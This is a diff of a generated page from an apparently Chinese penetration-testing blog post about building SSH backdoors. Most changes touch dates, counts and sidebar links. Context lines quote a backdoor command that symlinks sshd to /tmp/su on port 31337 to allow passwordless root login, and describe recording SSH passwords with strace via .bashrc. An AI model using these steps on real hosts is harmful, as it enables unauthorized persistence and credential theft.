@@ -93,7 +93,7 @@
 <meta property="og:site_name" content="MaiKeFee|">
 <meta property="og:description" content="1.入侵得到SHELL后，对方防火墙没限制，想快速开放一个可以访问的SSH端口肉鸡上执行  ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337;就会派生一个31337端口，然后连接31337，用root/bin/ftp/mail当用户名，密码随意，就可登陆。  2.做一个SSH wrapper后门，效果比第一个好，没有开放额外的端口，只要对方开了">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-09-03T12:02:59.949Z">
+<meta property="og:updated_time" content="2019-09-04T07:52:23.865Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="渗透过程中的SSH(后门建立)">
 <meta name="twitter:description" content="1.入侵得到SHELL后，对方防火墙没限制，想快速开放一个可以访问的SSH端口肉鸡上执行  ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337;就会派生一个31337端口，然后连接31337，用root/bin/ftp/mail当用户名，密码随意，就可登陆。  2.做一个SSH wrapper后门，效果比第一个好，没有开放额外的端口，只要对方开了">
@@ -357,8 +357,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-09-03T20:02:59+08:00">
-                2019-09-03
+              <time title="更新于" itemprop="dateModified" datetime="2019-09-04T15:52:23+08:00">
+                2019-09-04
               </time>
             
           </span>
@@ -525,8 +525,7 @@
 &gt;&gt;&gt; print repr(buffer)
 &apos;\x00\x00LF&apos;
 &gt;&gt;&gt; buffer = struct.pack(&apos;&gt;I6&apos;,13377)
-&gt;&gt;&gt; print buffer</code></pre><p>4A</p>
-<blockquote>
+&gt;&gt;&gt; print buffer</code></pre><blockquote>
 <ol start="3">
 <li>记录SSH客户端连接密码<br>搞定主机后，往往想记录肉鸡SSH连接到其他主机的密码，进一步扩大战果，使用strace命令就行了。<br>在肉鸡上修改要记录密码用户目录的.bashrc，添加一行:</li>
 </ol>
@@ -653,7 +652,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-count">33</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -675,7 +674,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -719,6 +718,10 @@
         
         
           <li>
+            <a href="/archives/38f7c93b.html" title="PPTP口令爆破" target="_blank">PPTP口令爆破</a>
+          </li>
+        
+          <li>
             <a href="/archives/fcea265e.html" title="网络设备的默认密码(交换机、路由器、安全设备)" target="_blank">网络设备的默认密码(交换机、路由器、安全设备)</a>
           </li>
         
@@ -732,10 +735,6 @@
         
           <li>
             <a href="/archives/452f04ea.html" title="Win 提权技巧" target="_blank">Win 提权技巧</a>
-          </li>
-        
-          <li>
-            <a href="/archives/f71d256c.html" title="Python库安全工具总纲" target="_blank">Python库安全工具总纲</a>
           </li>
         
       </ul>
